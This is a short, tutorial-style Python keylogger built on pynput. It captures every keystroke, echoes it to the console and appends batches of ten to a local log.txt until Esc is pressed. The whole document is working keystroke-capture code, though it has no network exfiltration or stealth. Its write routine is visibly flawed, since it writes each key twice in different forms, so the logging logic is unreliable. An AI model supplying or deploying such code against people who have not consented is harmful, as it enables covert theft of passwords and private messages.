
import pynput
from pynput.keyboard import Key, Listener


count = 0
keys = []


# define on_press function

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # this is going to press key in our string when printed.
    # you can continue to print or you can comment out. Either way the keys will be kept on the log.txt file.
    print("{0} pressed".format(key))

    # if keys are more than 10 pressed. print the file, then reset the key count pressed back to 0.
    # This makes sure that we don't continue to count their keys after exiting the program.
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


# Allows to write all our keys into the log.txt file for us.
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:

            k = str(key).replace("'", "")

            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

            f.write(str(key))

# defined on_release function


def on_release(key):

    # This will allow us to break out of the loop when we press the Esc key.
    if key == Key.esc:
        return False


# This is what listens to our key presses in the app.
# on_press and on_release are the functions that are called when a key is pressed and released.
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
